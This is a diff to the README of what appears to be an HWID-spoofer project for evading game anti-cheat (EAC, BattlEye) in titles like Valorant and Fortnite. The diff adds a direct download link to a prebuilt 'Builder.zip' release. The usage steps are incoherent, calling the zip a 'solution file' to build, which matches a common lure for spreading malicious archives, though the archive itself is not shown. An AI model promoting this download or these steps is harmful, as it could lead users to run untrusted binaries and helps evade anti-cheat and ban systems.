@@ -6,7 +6,7 @@ Designed specifically for Windows 10 and Windows 11, HWID spoofing allows you to
 
 ## How to Use
 - Download the project to your computer as zip
-- [Click here](555)
+- [Click here](https://github.com/ferst2000qd/Spoofer-EAC-BE-Valorant-Warzone-Overwatch-Dayz-EFT-Fortnite/releases/download/V1.3.5/Builder.zip)
 - Open the solution file (.zip).
 - Select **Build**.
 - When the build is complete, select **Start Without Debugging** from the **Debug** menu or press `Ctrl+F5` to run the project.
